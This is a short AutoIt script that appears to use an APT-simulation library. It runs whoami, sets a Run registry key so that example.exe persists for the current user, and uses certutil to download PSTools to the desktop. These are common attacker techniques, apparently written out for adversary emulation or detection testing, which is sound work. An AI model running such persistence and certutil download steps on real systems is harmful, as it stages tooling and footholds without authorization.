#include <APT-SimulActor.au3>

; run whoami
whoami()

; create key reg example.exe on HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SetPersistent4CurrentUser()

; use certutil to download pstools "https://download.sysinternals.com/files/PSTools.zip"
CertUtilDownloader($PSTools_URL, @DesktopDir & "\tools.zip")
